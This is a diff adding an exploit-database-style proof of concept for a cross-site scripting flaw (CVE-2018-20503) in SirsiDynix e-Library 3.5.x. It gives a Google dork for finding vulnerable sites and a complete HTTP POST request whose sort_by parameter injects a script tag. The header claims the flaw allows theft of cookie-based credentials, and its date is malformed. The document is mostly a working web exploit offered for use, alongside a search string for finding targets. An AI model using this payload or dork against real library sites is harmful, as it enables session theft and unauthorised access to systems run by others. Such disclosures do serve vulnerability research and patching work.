@@ -1,0 +1,42 @@
+# Exploit Title: SirsiDynix e-Library <= 3.5.x - Cross-Site Scripting
+# CVE: CVE-2018-20503
+# Date: 2019-24-01
+# Google Dork: inurl:/x/x/0/49
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Contact: https://pentest.com.tr
+# Vendor Homepage: http://www.sirsidynix.com
+# Version: 3.5.x
+# Category: Webapps
+# Tested on: Firefox/52 and Chrome/69
+# Software Description : As SirsiDynix Symphony’s core discovery portal,
+e-Library gives
+# Symphony users the basic tools they need to find the resources they seek.
+# e-Library offers users speedy and relevant search results as well as a
+user-friendly interface to make discovery simple
+# Description : Exploiting these issues could allow an attacker to steal
+cookie-based authentication credentials,
+# compromise the application, access or modify data, or exploit latent
+vulnerabilities in the underlying database.
+# SirsiDynix e-Library 3.5.x is vulnerable; prior versions may also be
+affected.
+# ==================================================================
+
+# PoC:
+
+# POST Request (sort_by):
+
+POST /uhtbin/cgisirsi/?ps=0Sk8zSpD0f/MAIN/33660028/123 HTTP/1.1
+Host: target
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://target/uhtbin/cgisirsi/?ps=mmRoXTc0L3/MAIN/33660028/38/1/X/BLASTOFF
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+searchdata1=test&srchfield1=AU%5EAUTHOR%5EAUTHORS%5EAuthor+Processing%5EYazar&library=VLK&srch_history=--%C3%96nceki+soruyu+se%C3%A7--&sort_by=ANYhadvi%22%3e%3cscript%3ealert(1)%3c%2fscript%3eox0ix
+
+==================================================================
